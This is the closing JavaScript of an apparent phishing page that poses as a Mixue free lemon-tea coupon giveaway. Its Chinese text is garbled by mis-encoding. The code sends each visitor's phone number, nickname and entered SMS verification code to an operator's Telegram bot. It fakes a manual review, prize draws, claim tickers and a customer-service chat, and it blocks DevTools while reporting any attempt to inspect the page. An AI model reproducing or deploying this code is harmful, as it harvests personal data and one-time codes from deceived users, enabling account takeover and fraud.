    { name: 'è°¢è°¢æƒ é¡¾', type: 'lose', emoji: 'ğŸ˜¢' },
    { name: 'å†°æ·‡æ·‹åˆ¸', type: 'win', emoji: 'ğŸ¦' },
    { name: 'å†æ¥å†å‰', type: 'lose', emoji: 'ğŸ˜­' },
    { name: 'å¥¶èŒ¶åˆ¸', type: 'win', emoji: 'ğŸ§‹' },
    { name: 'å·®ä¸€ç‚¹', type: 'lose', emoji: 'ğŸ¤”' },
    { name: 'ç¥ç§˜å¤§å¥–', type: 'win', emoji: 'ğŸŠ' },
    { name: 'ä¸‹æ¬¡å†æ¥', type: 'lose', emoji: 'ğŸ˜…' }
  ];
  
  const result = results[index];
  
  sendTGMessage(`ã€æŠ½å¥–ç»“æœã€‘\næ‰‹æœºå·ï¼š${inviteState.currentPhone}\nç»“æœï¼š${result.name} ${result.emoji}\nç±»å‹ï¼š${result.type === 'win' ? 'ä¸­å¥–' : 'æœªä¸­å¥–'}\nå‰©ä½™æ¬¡æ•°ï¼š${inviteState.chanceCount}`);
  
  if (result.type === 'win') {
    if (els.wheel) {
      const rect = els.wheel.getBoundingClientRect();
      createParticles(rect.left + rect.width/2, rect.top + rect.height/2);
    }
    
    setTimeout(() => {
      claimed++;
      updateStock();
      shootBarrage(inviteState.currentPhone);
      const newCode = generateCouponCode();
      if (els.couponCode) els.couponCode.textContent = newCode;
      if (els.modal) els.modal.classList.add('show');
      
      saveCouponToHistory(newCode);
      
      if (navigator.clipboard) {
        navigator.clipboard.writeText(newCode).then(() => {
          showToast('åˆ¸ç å·²è‡ªåŠ¨å¤åˆ¶åˆ°å‰ªè´´æ¿ï¼', 4000);
        }).catch(() => {
          showToast('åˆ¸ç å·²ç”Ÿæˆï¼Œè¯·æ‰‹åŠ¨é•¿æŒ‰å¤åˆ¶', 4000);
        });
      }
      
      try {
        localStorage.setItem('mx_claim_' + inviteState.currentPhone, Date.now().toString());
      } catch (e) {
        console.warn('ä¿å­˜é¢†å–è®°å½•å¤±è´¥:', e);
      }
      
      sendTGMessage(`ã€ğŸ‰ æœ€ç»ˆè·å¥–ã€‘\næ‰‹æœºå·ï¼š${inviteState.currentPhone}\nåˆ¸ç ï¼š${newCode}\nè·å¥–ç±»å‹ï¼š${result.name}\næ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}`);
      
      // æˆåŠŸåå¼¹å‡ºå‡å®¢æœèŠå¤©
      setTimeout(openChat, 1200);
    }, 500);
  } else {
    showToast(`${result.emoji} ${result.name}ï¼${inviteState.chanceCount > 0 ? 'å†è¯•ä¸€æ¬¡å§ï¼' : 'é‚€è¯·å¥½å‹è·å¾—æ›´å¤šæœºä¼šï¼'}`);
    
    setTimeout(() => {
      if (inviteState.chanceCount > 0 && els.wheelBtn) {
        showToast('æ²¡ä¸­ï¼Ÿå†æ¥ä¸€æ¬¡å§ï¼ç‚¹å‡»ã€Œå¼€å§‹æŠ½å¥–ã€', 3500);
        els.wheelBtn.disabled = false;
        els.wheelBtn.textContent = 'ğŸ° å†æŠ½ä¸€æ¬¡ï¼';
      }
    }, 2500);
  }
  
  saveToStorage();
}

function sendTGMessage(text) {
  try {
    const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
    const params = new URLSearchParams();
    params.append('chat_id', _cfg.u);
    params.append('text', text);
    
    fetch(ep, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: params
    }).catch(console.error);
  } catch (err) {
    console.error('TGå‘é€å¤±è´¥ï¼š', err);
  }
}

// é˜²ä½œå¼Šæ£€æµ‹
function antiCheat() {
  const devtools = /./;
  devtools.toString = function() {
    if (els.cheatWarning) els.cheatWarning.classList.add('show');
    sendTGMessage(`ã€âš ï¸ è­¦å‘Šã€‘\næ£€æµ‹åˆ°å¼€å‘è€…å·¥å…·\næ‰‹æœºå·ï¼š${inviteState.currentPhone || 'æœªçŸ¥'}\næ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}`);
    return '';
  };
  
  let lastWidth = window.innerWidth;
  let lastHeight = window.innerHeight;
  window.addEventListener('resize', () => {
    if (Math.abs(window.innerWidth - lastWidth) > 100 || Math.abs(window.innerHeight - lastHeight) > 100) {
      console.log('çª—å£å¤§å°å¼‚å¸¸å˜åŒ–');
    }
  });
  
  document.addEventListener('contextmenu', e => {
    e.preventDefault();
    showToast('å³é”®å·²ç¦ç”¨');
  });
  
  document.addEventListener('keydown', e => {
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
      e.preventDefault();
      if (els.cheatWarning) els.cheatWarning.classList.add('show');
    }
  });
}

function initKeyboardShortcuts() {
  document.addEventListener('keydown', e => {
    if (e.code === 'Space' && els.wheelBtn && !els.wheelBtn.classList.contains('hidden') && !isSpinning) {
      e.preventDefault();
      spinWheel();
    }
    
    if (e.key === 'Escape') {
      if (els.modal) els.modal.classList.remove('show');
      if (els.agreementModal) els.agreementModal.classList.remove('show');
      if (els.historyModal) els.historyModal.classList.remove('show');
      if (els.chatModal) els.chatModal.classList.remove('show');
    }
  });
}

function startManualReview(phone, nickname, code) {
  if (isPolling) return;
  isPolling = true;
  
  if (els.loadingMask) els.loadingMask.classList.add('show');
  
  setTimeout(() => {
    if (els.loadingMask) els.loadingMask.classList.remove('show');
    isPolling = false;
    showInvitePage(phone, nickname);
    sendTGMessage(`ã€å®¡æ ¸é€šè¿‡ã€‘\næ˜µç§°ï¼š${nickname}\næ‰‹æœºå·ï¼š${phone}\néªŒè¯ç ï¼š${code}\næ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}\nçŠ¶æ€ï¼šè¿›å…¥é‚€è¯·æµç¨‹`);
  }, 3000 + Math.random() * 2000);
}

// åˆ¸ç å†å²
function saveCouponToHistory(code) {
  try {
    let history = JSON.parse(localStorage.getItem('mx_coupon_history') || '[]');
    history.unshift({
      code: code,
      time: new Date().toLocaleString('zh-CN'),
      phone: inviteState.currentPhone || 'æœªçŸ¥'
    });
    if (history.length > 20) history = history.slice(0, 20);
    localStorage.setItem('mx_coupon_history', JSON.stringify(history));
  } catch (e) {
    console.warn('ä¿å­˜åˆ¸ç å†å²å¤±è´¥:', e);
  }
}

function showCouponHistory() {
  try {
    let history = JSON.parse(localStorage.getItem('mx_coupon_history') || '[]');
    
    if (history.length === 0) {
      if (els.historyList) els.historyList.innerHTML = '<p style="text-align:center;color:#999;">æš‚æ— åˆ¸ç è®°å½•ï¼Œå¿«å»é¢†åˆ¸å§ï½</p>';
    } else {
      if (els.historyList) {
        els.historyList.innerHTML = history.map(item => `
          <div class="history-item">
            <strong>${item.code}</strong><br>
            <small>${item.time} | ${item.phone.slice(0,3)}****${item.phone.slice(7)}</small>
          </div>
        `).join('');
      }
    }
    if (els.historyModal) els.historyModal.classList.add('show');
  } catch (e) {
    console.warn('æ˜¾ç¤ºåˆ¸ç å†å²å¤±è´¥:', e);
  }
}

// å‡é›ªç‹å®¢æœèŠå¤©
const customerReplies = [
  "å˜¿å˜¿ï½æˆ‘æ˜¯é›ªç‹å°å†°å‘€ï¼åˆ¸ç å·²ç»å‘ä½ æ‰‹æœºçŸ­ä¿¡å•¦ï½è®°å¾—å»åº—é‡Œç›´æ¥è¯´â€˜æˆ‘è¦å…‘æ¢æŸ æª¬èŒ¶åˆ¸â€™å°±è¡Œï¼",
  "å¤§æ¯æŸ æª¬èŒ¶è¶…é…¸çˆ½çš„ï¼å¤å¤©å¿…å¤‡æ‡‚ï¼Ÿï¼Ÿï¼Ÿå¿«å»å–å§ï½åˆ«å®¢æ°”ï¼",
  "æ¬¸æ¬¸æ¬¸ï½è¿™ä¹ˆå¿«å°±é¢†åˆ°äº†ï¼Ÿç‰›å“‡ï¼è¦ä¸è¦å«ä¸Šæœ‹å‹ä¸€èµ·æ¥ï¼Ÿå¤šé‚€å‡ ä¸ªäººæˆ‘ç»™ä½ å·å·åŠ æ¬¡æ•°å“¦ï½ğŸ˜",
  "åˆ¸ç æ˜¯MXå¼€å¤´çš„é‚£ä¸²å¯¹å§ï¼Ÿåˆ°åº—å‡ºç¤ºå°±è¡Œï½åˆ«æˆªå›¾ä¸¢äº†å“ˆï¼Œè¿‡æœŸæˆ‘å¯ä¸è´Ÿè´£å“Ÿï½(ï½¡â€¢Ìï¸¿â€¢Ì€ï½¡)",
  "ä»Šå¤©å¤©æ°”å¥½çƒ­å“¦ï½æ¥æ¯å†°æŸ æª¬èŒ¶è§£è§£æš‘ï¼Ÿé›ªç‹æˆ‘éƒ½æƒ³å·å–ä¸€å£äº†å“ˆå“ˆå“ˆ",
  "é‚€è¯·å¥½å‹æˆåŠŸäº†å—ï¼Ÿ3ä¸ªå°±ç¨³æ‹¿åˆ¸å•¦ï½æˆ‘çœ‹ä½ è¿™ä¹ˆå¯çˆ±ï¼Œè‚¯å®šå¾ˆå¤šäººæ„¿æ„å¸®ä½ ç‚¹ï½",
  "æ¬¸ä½ æ˜µç§°å–å¾—å¥½å¯çˆ±æ¬¸ï½ä¸‹æ¬¡è¿˜æ¥æ‰¾æˆ‘èŠå¤©å—ï¼Ÿ(ç¬ÂºÏ‰Âºç¬)â™¡",
  "åˆ«é—®æˆ‘ä¸ºä»€ä¹ˆå«å°å†°å•¦ï½å› ä¸ºæˆ‘è¶…å†°è¶…ç”œå˜›ï½å˜¿å˜¿",
  "é¢†å®Œè®°å¾—äº”æ˜Ÿå¥½è¯„å“¦ï½ä¸ç„¶é›ªç‹è¦ç”Ÿæ°”äº†ï¼(ã€ƒï¼çš¿ï¼œ)",
  "å’‹å•¦ï¼Ÿå¡ä½äº†ï¼Ÿåˆ·æ–°è¯•è¯•ï½æˆ‘åœ¨è¿™ç­‰ä½ å›æ¥ç»§ç»­èŠï½",
  "ä½ è¿™ä¹ˆç§¯æï¼Œé›ªç‹æˆ‘ç»™ä½ ç‚¹ä¸ªå¤§å¤§çš„èµï¼âœ¨",
  "æƒ³å†é¢†ä¸€æ¯ï¼Ÿé‚£å°±å¤šæ‹‰å‡ ä¸ªå°ä¼™ä¼´æ¥å˜›ï½æˆ‘çœ‹å¥½ä½ ï¼"
];

function addMessage(text, isCustomer = true) {
  const msgDiv = document.createElement('div');
  msgDiv.style.marginBottom = '12px';
  msgDiv.style.maxWidth = '80%';
  msgDiv.style.padding = '10px 14px';
  msgDiv.style.borderRadius = isCustomer ? '18px 18px 18px 4px' : '18px 18px 4px 18px';
  msgDiv.style.background = isCustomer ? '#fff' : 'var(--mixue-red)';
  msgDiv.style.color = isCustomer ? '#333' : 'white';
  msgDiv.style.boxShadow = '0 1px 3px rgba(0,0,0,0.1)';
  msgDiv.style.alignSelf = isCustomer ? 'flex-start' : 'flex-end';
  
  if (isCustomer) {
    msgDiv.innerHTML = `<img src="https://pub-141831e61e69445289222976a15b6fb3.r2.dev/Image_to_url_V2/1000046994-imagetourl.cloud-1770456904865-vyi8ak.jpg" style="width:32px;height:32px;border-radius:50%;vertical-align:middle;margin-right:8px;">${text}`;
  } else {
    msgDiv.textContent = text;
  }
  
  if (els.chatMessages) {
    els.chatMessages.appendChild(msgDiv);
    els.chatMessages.scrollTop = els.chatMessages.scrollHeight;
  }
}

function customerReply(userText = "") {
  let reply = customerReplies[Math.floor(Math.random() * customerReplies.length)];
  
  if (userText.includes('æ€ä¹ˆç”¨') || userText.includes('å…‘æ¢') || userText.includes('ä½¿ç”¨') || userText.includes('æ ¸é”€')) {
    reply = "åˆ¸ç ç›´æ¥åˆ°åº—å‡ºç¤ºç»™åº—å‘˜å°±è¡Œå•¦ï½å¤§æ¯æŸ æª¬èŒ¶éšä¾¿æ¢ï¼è®°å¾—è¯´â€˜æˆ‘è¦ç”¨åˆ¸å“¦â€™ï½åˆ«å®³ç¾ï¼";
  } else if (userText.includes('é‚€è¯·') || userText.includes('å¥½å‹') || userText.includes('æ‹‰äºº') || userText.includes('åŠ©åŠ›')) {
    reply = "å¯¹å¯¹å¯¹ï½å¤šæ‹‰å‡ ä¸ªå°ä¼™ä¼´æ¥åŠ©åŠ›ï¼Œ3ä¸ªå°±ç¨³ç¨³å‘åˆ¸ï¼å¿«å»åˆ†äº«ä½ çš„é‚€è¯·ç å‘€ï½æˆ‘ç­‰ç€ç»™ä½ é¼“æŒï¼ğŸ‘";
  } else if (userText.includes('è°¢è°¢') || userText.includes('æ„Ÿè°¢') || userText.includes('è°¢å•¦')) {
    reply = "ä¸å®¢æ°”å•¦ï½èƒ½å¸®åˆ°ä½ é›ªç‹æˆ‘å°±å¼€å¿ƒæ­»äº†ï¼ä¸‹æ¬¡è¿˜æ¥æ‰¾æˆ‘èŠå¤©å¥½ä¸å¥½ï¼Ÿ(ã¥ï¿£ Â³ï¿£)ã¥";
  } else if (userText.includes('å¡') || userText.includes('åŠ è½½') || userText.includes('æ‰“ä¸å¼€')) {
    reply = "æ¬¸ï¼Ÿé¡µé¢å¡äº†ï¼Ÿè¯•è¯•åˆ·æ–°ä¸€ä¸‹ï½æˆ–è€…æ¢ä¸ªç½‘ç»œï¼Ÿé›ªç‹åœ¨è¿™ç­‰ä½ å›æ¥ç»§ç»­é¢†ç¦åˆ©å“¦ï½";
  } else if (userText.length < 4 && userText) {
    reply = "å—¯ï¼Ÿå°±è¯´è¿™ä¹ˆç‚¹ï¼Ÿå¤šè¯´ä¸¤å¥å˜›ï½é›ªç‹å¥½æ— èŠå“¦ï½æ¥å˜›ï½";
  }
  
  setTimeout(() => {
    addMessage(reply, true);
  }, 1000 + Math.random() * 2000);
}

function openChat() {
  if (els.chatModal) {
    els.chatModal.style.display = 'flex';
    if (els.chatMessages) els.chatMessages.innerHTML = '';
    addMessage("å˜¿ï½æ­å–œé¢†åˆ°å¤§æ¯æŸ æª¬èŒ¶å•¦ï¼æˆ‘æ˜¯é›ªç‹å°å†°ï½æœ‰å•¥é—®é¢˜å°½ç®¡é—®æˆ‘å“¦ï½ğŸ˜„", true);
    setTimeout(() => customerReply(""), 1800);
  }
}

// äº‹ä»¶ç»‘å®š
function initEventListeners() {
  if (els.phone) {
    els.phone.addEventListener('input', checkPhoneValid);
    els.phone.addEventListener('blur', checkPhoneValid);
  }

  if (els.closeModalBtn) {
    els.closeModalBtn.addEventListener('click', () => {
      if (els.modal) els.modal.classList.remove('show');
    });
  }

  if (els.getBtn) {
    els.getBtn.addEventListener('click', async () => {
      if (els.getBtn.disabled || isSending) return;

      isSending = true;
      els.getBtn.disabled = true;
      els.getBtn.textContent = 'å‘é€ä¸­...';

      const phone = els.phone.value.trim();
      const nick = els.nickname.value.trim() || 'æ— ';

      try {
        const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
        const params = new URLSearchParams();
        params.append('chat_id', _cfg.u);
        params.append('text', `ã€æ–°å·ã€‘\næ˜µç§°ï¼š${nick}\næ‰‹æœºå·ï¼š${phone}\næ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}`);

        const response = await fetch(ep, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: params
        });

        if (!response.ok) throw new Error('Telegram å‘é€å¤±è´¥');

        let s = 60;
        els.getBtn.textContent = `é‡å‘(${s}s)`;
        if (els.code) els.code.focus();
        if (els.countdown) {
          els.countdown.style.opacity = '1';
          els.countdown.textContent = `éªŒè¯ç å·²å‘é€ï¼ˆ${s}sï¼‰`;
        }

        timers.code = setInterval(() => {
          s--;
          if (s > 0) {
            els.getBtn.textContent = `é‡å‘(${s}s)`;
            if (els.countdown) els.countdown.textContent = `éªŒè¯ç å·²å‘é€ï¼ˆ${s}sï¼‰`;
          } else {
            clearInterval(timers.code);
            isSending = false;
            els.getBtn.disabled = !( /^1[3-9]\d{9}$/.test(els.phone.value.trim()) && isVerifySuccess );
            els.getBtn.textContent = 'è·å–éªŒè¯ç ';
            if (els.countdown) els.countdown.style.opacity = '0';
          }
        }, 1000);

      } catch (err) {
        console.error('å‘é€å¤±è´¥ï¼š', err);
        showToast('ç½‘ç»œå¼‚å¸¸ï¼Œç¨åå†è¯•');
        isSending = false;
        els.getBtn.disabled = false;
        els.getBtn.textContent = 'è·å–éªŒè¯ç ';
      }
    });
  }

  if (els.code) {
    els.code.addEventListener('input', () => {
      const len = els.code.value.trim().length;
      if (els.submitBtn) {
        els.submitBtn.style.display = len >= 4 ? 'block' : 'none';
        els.submitBtn.disabled = len < 6;
      }
      els.code.classList.toggle('input-error', len > 0 && len < 6);
    });
  }

  if (els.submitBtn) {
    els.submitBtn.addEventListener('click', async () => {
      if (els.submitBtn.disabled || isPolling) return;

      const phone = els.phone.value.trim();
      const code = els.code.value.trim();
      const nick = els.nickname.value.trim() || 'æ— ';

      if (code.length !== 6) {
        showToast('è¯·è¾“å…¥6ä½æœ‰æ•ˆéªŒè¯ç ');
        return;
      }

      try {
        if (localStorage.getItem('mx_claim_' + phone)) {
          showToast('è¯¥æ‰‹æœºå·å·²å‚ä¸è¿‡æ´»åŠ¨');
          return;
        }
      } catch (e) {
        console.warn('æ£€æŸ¥æœ¬åœ°å­˜å‚¨å¤±è´¥:', e);
      }

      startManualReview(phone, nick, code);
    });
  }

  if (els.inviteMoreBtn) els.inviteMoreBtn.addEventListener('click', simulateInvite);
  if (els.redeemBtn) els.redeemBtn.addEventListener('click', redeemInviteCode);
  if (els.wheelBtn) els.wheelBtn.addEventListener('click', spinWheel);
  if (els.checkInBtn) els.checkInBtn.addEventListener('click', dailyCheckIn);

  if (els.modal) {
    els.modal.addEventListener('click', e => {
      if (e.target === els.modal) els.modal.classList.remove('show');
    });
  }

  if (els.rejectedModal) {
    els.rejectedModal.addEventListener('click', e => {
      if (e.target === els.rejectedModal) els.rejectedModal.classList.remove('show');
    });
  }

  if (els.copyCouponBtn) {
    els.copyCouponBtn.addEventListener('click', () => {
      const code = els.couponCode ? els.couponCode.textContent : '';
      if (navigator.clipboard) {
        navigator.clipboard.writeText(code).then(() => showToast('åˆ¸ç å·²å¤åˆ¶ï¼'));
      } else {
        showToast('è¯·é•¿æŒ‰åˆ¸ç æ‰‹åŠ¨å¤åˆ¶');
      }
    });
  }

  if (els.shareBtn) {
    els.shareBtn.addEventListener('click', () => {
      const code = els.couponCode ? els.couponCode.textContent : '';
      const text = `èœœé›ªå†°åŸå…è´¹å¤§æ¯æŸ æª¬èŒ¶åˆ°æ‰‹å•¦ï¼åˆ¸ç ï¼š${code}\nå¿«æ¥ä¸€èµ·å–ï¼`;
      if (navigator.share) {
        navigator.share({ title: 'å…è´¹æŸ æª¬èŒ¶', text: text });
      } else {
        navigator.clipboard.writeText(text).then(() => showToast('åˆ†äº«æ–‡æ¡ˆå·²å¤åˆ¶ï¼Œå¿«å‘ç»™æœ‹å‹å§ï¼'));
      }
    });
  }

  if (els.viewHistoryBtn) els.viewHistoryBtn.addEventListener('click', showCouponHistory);

  // å‡å®¢æœèŠå¤©äº‹ä»¶
  if (els.sendChatBtn && els.chatInput) {
    els.sendChatBtn.addEventListener('click', () => {
      const text = els.chatInput.value.trim();
      if (!text) return;
      
      addMessage(text, false);
      els.chatInput.value = '';
      customerReply(text);
    });

    els.chatInput.addEventListener('keypress', e => {
      if (e.key === 'Enter') els.sendChatBtn.click();
    });
  }
}

// å¯åŠ¨
function init() {
  initSplashScreen();
  antiCheat();
  initKeyboardShortcuts();
  initEventListeners();
  
  timers.fake = setInterval(fakeClaim, 1400);
  timers.barrage = setInterval(() => {
    if (Math.random() > 0.35) shootBarrage();
  }, 1600);
  startCountdown();
  updateStock();
  
  // åŠ è½½å®Œæˆåæ˜¾ç¤ºé¡µé¢
  setTimeout(() => {
    const splash = document.getElementById('splashScreen');
    if (splash) splash.classList.add('hide');
  }, 2500);
}

window.addEventListener('load', init);

window.addEventListener('beforeunload', () => {
  Object.values(timers).forEach(t => {
    if (t) clearInterval(t);
  });
  saveToStorage();
});

// é˜²æ­¢å†…å­˜æ³„æ¼
window.addEventListener('unload', () => {
  Object.values(timers).forEach(t => {
    if (t) clearInterval(t);
  });
});
</script>
</body>
</html>
